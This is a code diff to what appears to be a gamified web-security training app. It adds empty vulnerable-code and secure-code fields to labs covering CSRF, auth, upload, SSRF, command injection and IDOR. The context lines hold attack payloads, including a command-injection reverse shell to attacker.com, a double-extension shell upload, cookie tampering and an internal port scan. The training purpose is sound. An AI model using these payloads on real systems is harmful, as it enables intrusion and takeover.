@@ -164,6 +164,12 @@ db.query(query, [req.body.username, req.body.password], (err, result) => {
       { id: 'csrf-3', name: 'Token Bypass', payload: "csrf_token=PREDICT&amount=9999", description: 'Predictable token bypass', successCondition: 'token_bypass', xp: 100 },
     ],
     cvss: 8.1,
+    vulnerableCode: {
+      language: "",
+      snippet: "",
+      description: ""
+    },
+    secureCode: ""
   },
   {
     id: 'lab-auth',
@@ -197,6 +203,12 @@ db.query(query, [req.body.username, req.body.password], (err, result) => {
       { id: 'auth-4', name: 'Cookie Tamper', payload: 'user=admin; role=superadmin; remember=1', description: 'Tamper with session cookie values', successCondition: 'privilege_esc', xp: 90 },
     ],
     cvss: 9.1,
+    vulnerableCode: {
+      language: "",
+      snippet: "",
+      description: ""
+    },
+    secureCode: ""
   },
   {
     id: 'lab-upload',
@@ -229,6 +241,12 @@ db.query(query, [req.body.username, req.body.password], (err, result) => {
       { id: 'upload-3', name: 'Double Extension', payload: 'shell.php.jpg', description: 'Double extension bypass', successCondition: 'upload', xp: 80 },
     ],
     cvss: 9.9,
+    vulnerableCode: {
+      language: "",
+      snippet: "",
+      description: ""
+    },
+    secureCode: ""
   },
   {
     id: 'lab-ssrf',
@@ -261,6 +279,12 @@ db.query(query, [req.body.username, req.body.password], (err, result) => {
       { id: 'ssrf-3', name: 'Port Scan', payload: 'http://192.168.1.1:22', description: 'Scan internal network ports via SSRF', successCondition: 'scan', xp: 100 },
     ],
     cvss: 9.3,
+    vulnerableCode: {
+      language: "",
+      snippet: "",
+      description: ""
+    },
+    secureCode: ""
   },
   {
     id: 'lab-cmdi',
@@ -293,6 +317,12 @@ db.query(query, [req.body.username, req.body.password], (err, result) => {
       { id: 'cmdi-3', name: 'Reverse Shell', payload: '127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1', description: 'Establish reverse shell', successCondition: 'revshell', xp: 150 },
     ],
     cvss: 10.0,
+    vulnerableCode: {
+      language: "",
+      snippet: "",
+      description: ""
+    },
+    secureCode: ""
   },
   {
     id: 'lab-idor',
@@ -325,6 +355,12 @@ db.query(query, [req.body.username, req.body.password], (err, result) => {
       { id: 'idor-3', name: 'Order Enum', payload: '/api/orders/1001', description: 'View other users orders', successCondition: 'order_access', xp: 70 },
     ],
     cvss: 7.5,
+    vulnerableCode: {
+      language: "",
+      snippet: "",
+      description: ""
+    },
+    secureCode: ""
   },
 ];
 
